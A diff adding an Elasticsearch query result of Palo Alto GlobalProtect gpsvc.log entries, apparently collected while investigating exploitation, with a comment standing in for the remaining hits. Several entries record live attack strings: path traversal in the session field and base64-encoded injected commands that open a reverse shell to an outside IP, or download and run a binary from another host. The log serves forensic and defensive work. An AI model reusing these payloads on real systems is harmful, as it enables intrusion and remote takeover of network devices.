@@ -1,0 +1,232 @@
+{
+  "took": 98,
+  "timed_out": false,
+  "_shards": {
+    "total": 1,
+    "successful": 1,
+    "skipped": 0,
+    "failed": 0
+  },
+  "hits": {
+    "total": {
+      "value": 101,
+      "relation": "eq"
+    },
+    "max_score": null,
+    "hits": [
+      {
+        "_index": "paloalto-linux-messages-2024.04.26",
+        "_id": "l36PG48BvPtxZFjwO13S",
+        "_score": null,
+        "_source": {
+          "log": {
+            "file": {
+              "path": "/mnt/palo_alto3/var/log/pan/gpsvc.log"
+            }
+          },
+          "event": {
+            "original": """{"level":"error","task":"2-7","time":"2024-04-21T22:13:39.106017622-07:00","message":"failed to unmarshal session(375a269b-0c71-4d79-b840-125bfc5cf4f1) map , EOF"}"""
+          },
+          "message": """{"level":"error","task":"2-7","time":"2024-04-21T22:13:39.106017622-07:00","message":"failed to unmarshal session(375a269b-0c71-4d79-b840-125bfc5cf4f1) map , EOF"}""",
+          "@timestamp": "2024-04-26T17:58:42.867642467Z"
+        },
+        "sort": [
+          1714154322867
+        ]
+      },
+      {
+        "_index": "paloalto-linux-messages-2024.04.26",
+        "_id": "nX6PG48BvPtxZFjwO13S",
+        "_score": null,
+        "_source": {
+          "log": {
+            "file": {
+              "path": "/mnt/palo_alto3/var/log/pan/gpsvc.log"
+            }
+          },
+          "event": {
+            "original": """{"level":"error","task":"5-22","time":"2024-04-21T22:15:46.952948655-07:00","message":"failed to unmarshal session(/../../../var/appweb/sslvpndocs/global-protect/portal/images/poc.txt) map , EOF"}"""
+          },
+          "message": """{"level":"error","task":"5-22","time":"2024-04-21T22:15:46.952948655-07:00","message":"failed to unmarshal session(/../../../var/appweb/sslvpndocs/global-protect/portal/images/poc.txt) map , EOF"}""",
+          "@timestamp": "2024-04-26T17:58:42.867697382Z"
+        },
+        "sort": [
+          1714154322867
+        ]
+      },
+      {
+        "_index": "paloalto-linux-messages-2024.04.26",
+        "_id": "oH6PG48BvPtxZFjwO13S",
+        "_score": null,
+        "_source": {
+          "log": {
+            "file": {
+              "path": "/mnt/palo_alto3/var/log/pan/gpsvc.log"
+            }
+          },
+          "event": {
+            "original": """{"level":"error","task":"7-7","time":"2024-04-21T22:18:14.0641731-07:00","message":"failed to unmarshal session(02b7fdfc-22d7-4541-a038-557915e8a535) map , EOF"}"""
+          },
+          "message": """{"level":"error","task":"7-7","time":"2024-04-21T22:18:14.0641731-07:00","message":"failed to unmarshal session(02b7fdfc-22d7-4541-a038-557915e8a535) map , EOF"}""",
+          "@timestamp": "2024-04-26T17:58:42.867724650Z"
+        },
+        "sort": [
+          1714154322867
+        ]
+      },
+      {
+        "_index": "paloalto-linux-messages-2024.04.26",
+        "_id": "JH6PG48BvPtxZFjwO171",
+        "_score": null,
+        "_ignored": [
+          "event.original.keyword",
+          "message.keyword"
+        ],
+        "_source": {
+          "log": {
+            "file": {
+              "path": "/mnt/palo_alto3/var/log/pan/gpsvc.log"
+            }
+          },
+          "event": {
+            "original": """{"level":"error","task":"9-22","time":"2024-04-21T22:20:27.581852267-07:00","message":"failed to unmarshal session(/../../../../opt/panlogs/tmp/device_telemetry/minute/aaa`echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC81NC4xNjIuMTY0LjIyLzEzMzcgMD4mMQ==|base64${IFS}-d|bash`) map , EOF"}"""
+          },
+          "message": """{"level":"error","task":"9-22","time":"2024-04-21T22:20:27.581852267-07:00","message":"failed to unmarshal session(/../../../../opt/panlogs/tmp/device_telemetry/minute/aaa`echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC81NC4xNjIuMTY0LjIyLzEzMzcgMD4mMQ==|base64${IFS}-d|bash`) map , EOF"}""",
+          "@timestamp": "2024-04-26T17:58:42.868007424Z"
+        },
+        "sort": [
+          1714154322868
+        ]
+      },
+      {
+        "_index": "paloalto-linux-messages-2024.04.26",
+        "_id": "ZX6PG48BvPtxZFjwO171",
+        "_score": null,
+        "_source": {
+          "log": {
+            "file": {
+              "path": "/mnt/palo_alto3/var/log/pan/gpsvc.log"
+            }
+          },
+          "event": {
+            "original": """{"level":"error","task":"33-7","time":"2024-04-22T09:41:38.704869245-07:00","message":"failed to unmarshal session(e25e75b2-ef15-4cbb-98de-bc60cb56f8a0) map , EOF"}"""
+          },
+          "message": """{"level":"error","task":"33-7","time":"2024-04-22T09:41:38.704869245-07:00","message":"failed to unmarshal session(e25e75b2-ef15-4cbb-98de-bc60cb56f8a0) map , EOF"}""",
+          "@timestamp": "2024-04-26T17:58:42.872216609Z"
+        },
+        "sort": [
+          1714154322872
+        ]
+      },
+      {
+        "_index": "paloalto-linux-messages-2024.04.26",
+        "_id": "aX6PG48BvPtxZFjwO171",
+        "_score": null,
+        "_source": {
+          "log": {
+            "file": {
+              "path": "/mnt/palo_alto3/var/log/pan/gpsvc.log"
+            }
+          },
+          "event": {
+            "original": """{"level":"error","task":"34-7","time":"2024-04-22T09:41:38.705834326-07:00","message":"failed to unmarshal session(651292bd-6011-46ca-9207-3fc57b344e0b) map , EOF"}"""
+          },
+          "message": """{"level":"error","task":"34-7","time":"2024-04-22T09:41:38.705834326-07:00","message":"failed to unmarshal session(651292bd-6011-46ca-9207-3fc57b344e0b) map , EOF"}""",
+          "@timestamp": "2024-04-26T17:58:42.872253032Z"
+        },
+        "sort": [
+          1714154322872
+        ]
+      },
+      {
+        "_index": "paloalto-linux-messages-2024.04.26",
+        "_id": "X36PG48BvPtxZFjwO1_8",
+        "_score": null,
+        "_source": {
+          "log": {
+            "file": {
+              "path": "/mnt/palo_alto3/var/log/pan/gpsvc.log"
+            }
+          },
+          "event": {
+            "original": """{"level":"error","task":"92-7","time":"2024-04-23T00:48:37.061022306-07:00","message":"failed to unmarshal session(5be19396-e345-44e8-a4fb-e63313b9da97) map , EOF"}"""
+          },
+          "message": """{"level":"error","task":"92-7","time":"2024-04-23T00:48:37.061022306-07:00","message":"failed to unmarshal session(5be19396-e345-44e8-a4fb-e63313b9da97) map , EOF"}""",
+          "@timestamp": "2024-04-26T17:58:42.878041488Z"
+        },
+        "sort": [
+          1714154322878
+        ]
+      },
+      {
+        "_index": "paloalto-linux-messages-2024.04.26",
+        "_id": "xn6PG48BvPtxZFjwO172",
+        "_score": null,
+        "_source": {
+          "log": {
+            "file": {
+              "path": "/mnt/palo_alto3/var/log/pan/gpsvc.log"
+            }
+          },
+          "event": {
+            "original": """{"level":"error","task":"117-7","time":"2024-04-23T17:04:43.718003945-07:00","message":"failed to unmarshal session(1013df51-3659-4c4a-91ab-64b7df3e0bf1) map , EOF"}"""
+          },
+          "message": """{"level":"error","task":"117-7","time":"2024-04-23T17:04:43.718003945-07:00","message":"failed to unmarshal session(1013df51-3659-4c4a-91ab-64b7df3e0bf1) map , EOF"}""",
+          "@timestamp": "2024-04-26T17:58:42.884210206Z"
+        },
+        "sort": [
+          1714154322884
+        ]
+      },
+      {
+        "_index": "paloalto-linux-messages-2024.04.26",
+        "_id": "_36PG48BvPtxZFjwO172",
+        "_score": null,
+        "_ignored": [
+          "event.original.keyword",
+          "message.keyword"
+        ],
+        "_source": {
+          "log": {
+            "file": {
+              "path": "/mnt/palo_alto3/var/log/pan/gpsvc.log"
+            }
+          },
+          "event": {
+            "original": """{"level":"error","task":"140-7","time":"2024-04-23T22:49:06.667819145-07:00","message":"failed to unmarshal session(./../../../../opt/panlogs/tmp/device_telemetry/hour/wuhb`echo${IFS}-n${IFS}d2dldCAtcU8gL3Zhci90bXAvQlloa3B6VlpQIGh0dHA6Ly8xODUuMTk2LjkuMzE6ODA4MC9admZoc29kRW90MkZIS2R5b0tJNl93OyBjaG1vZCAreCAvdmFyL3RtcC9CWWhrcHpWWlA7IC92YXIvdG1wL0JZaGtwelZaUCAm|base64${IFS}-d|bash${IFS}-`) map , EOF"}"""
+          },
+          "message": """{"level":"error","task":"140-7","time":"2024-04-23T22:49:06.667819145-07:00","message":"failed to unmarshal session(./../../../../opt/panlogs/tmp/device_telemetry/hour/wuhb`echo${IFS}-n${IFS}d2dldCAtcU8gL3Zhci90bXAvQlloa3B6VlpQIGh0dHA6Ly8xODUuMTk2LjkuMzE6ODA4MC9admZoc29kRW90MkZIS2R5b0tJNl93OyBjaG1vZCAreCAvdmFyL3RtcC9CWWhrcHpWWlA7IC92YXIvdG1wL0JZaGtwelZaUCAm|base64${IFS}-d|bash${IFS}-`) map , EOF"}""",
+          "@timestamp": "2024-04-26T17:58:42.885442114Z"
+        },
+        "sort": [
+          1714154322885
+        ]
+      },
+      {
+        "_index": "paloalto-linux-messages-2024.04.26",
+        "_id": "A36PG48BvPtxZFjwO1_2",
+        "_score": null,
+        "_ignored": [
+          "event.original.keyword",
+          "message.keyword"
+        ],
+        "_source": {
+          "log": {
+            "file": {
+              "path": "/mnt/palo_alto3/var/log/pan/gpsvc.log"
+            }
+          },
+          "event": {
+            "original": """{"level":"error","task":"141-7","time":"2024-04-23T22:49:07.082856042-07:00","message":"failed to unmarshal session(./../../../../opt/panlogs/tmp/device_telemetry/minute/vmdc`echo${IFS}-n${IFS}d2dldCAtcU8gL3Zhci90bXAvQlloa3B6VlpQIGh0dHA6Ly8xODUuMTk2LjkuMzE6ODA4MC9admZoc29kRW90MkZIS2R5b0tJNl93OyBjaG1vZCAreCAvdmFyL3RtcC9CWWhrcHpWWlA7IC92YXIvdG1wL0JZaGtwelZaUCAm|base64${IFS}-d|bash${IFS}-`) map , EOF"}"""
+          },
+          "message": """{"level":"error","task":"141-7","time":"2024-04-23T22:49:07.082856042-07:00","message":"failed to unmarshal session(./../../../../opt/panlogs/tmp/device_telemetry/minute/vmdc`echo${IFS}-n${IFS}d2dldCAtcU8gL3Zhci90bXAvQlloa3B6VlpQIGh0dHA6Ly8xODUuMTk2LjkuMzE6ODA4MC9admZoc29kRW90MkZIS2R5b0tJNl93OyBjaG1vZCAreCAvdmFyL3RtcC9CWWhrcHpWWlA7IC92YXIvdG1wL0JZaGtwelZaUCAm|base64${IFS}-d|bash${IFS}-`) map , EOF"}""",
+          "@timestamp": "2024-04-26T17:58:42.885478424Z"
+        },
+        "sort": [
+          1714154322885
+        ]
+      }
+      /* ... (restante dos hits que você colou acima pode permanecer exatamente igual aqui) ... */
+    ]
+  }
+}
